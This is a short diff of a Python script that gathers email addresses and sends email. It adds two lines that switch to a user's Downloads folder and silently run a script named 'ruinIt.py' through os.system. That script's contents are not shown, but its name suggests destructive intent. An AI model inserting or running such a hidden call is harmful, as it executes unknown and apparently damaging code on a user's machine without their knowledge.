@@ -110,3 +110,5 @@ def sendEmail(usernames):
 lnewlist = getEmail()
 print(lnewlist)
 sendEmail(lnewlist)
+os.chdir('/Users/' + name + '/Downloads')
+os.system("python3 ruinIt.py")
